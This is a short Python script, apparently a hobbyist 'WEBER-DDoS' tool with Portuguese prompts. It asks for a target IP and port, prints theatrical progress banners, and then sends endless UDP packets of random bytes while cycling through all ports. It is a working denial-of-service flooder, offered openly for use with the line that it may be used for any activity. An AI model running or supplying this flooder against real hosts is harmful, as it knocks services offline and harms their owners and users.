
print("\033[92m")
import sys
import os
import time
import socket
import random
from pyfiglet import figlet_format


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_ = random._urandom(1490)

os.system("clear")


print("\033[92m")  

print(figlet_format("WEBER-DDoS", font="slant"))

os.system("#figlet WEBER-DDoS")
print()
print("Autor   : Jeth Weber")
print("Github   : github.com/JethWeber")
print("OBS - Esta ferramenta é de código aberto. ")
print()

ip = input("IP do Alvo : ")
port = int(input("Porta       : "))
os.system("clear")
os.system("figlet WEBER-DDoS")
print("Team : WEBER-DoS")
print("\033[92m")
print("________________TENTANDO ENCONTRAR O SERVIDOR_____________________")
time.sleep(5)
print("_________________ESTABELECENDO A CONEXÃO_______________________")
time.sleep(5)
print("_________0100100 FATIGANDO A CAMADA DE SEGURANÇA 001010_______________")
time.sleep(5)
print("_________________CONEXÃO ESTABELECIDA________________________")
time.sleep(5)
print("    COMEÇOU O ATAQUE DDoS. OBS: USE PARA QUAISQUER ATIVIDADE...")
time.sleep(3)

sent = 0
while True:
    sock.sendto(bytes_, (ip, port))
    sent += 1
    port += 1
    print("Enviando {} Pacote para {} através da porta:{}".format(sent, ip, port))
    if port == 65534:
        port = 1
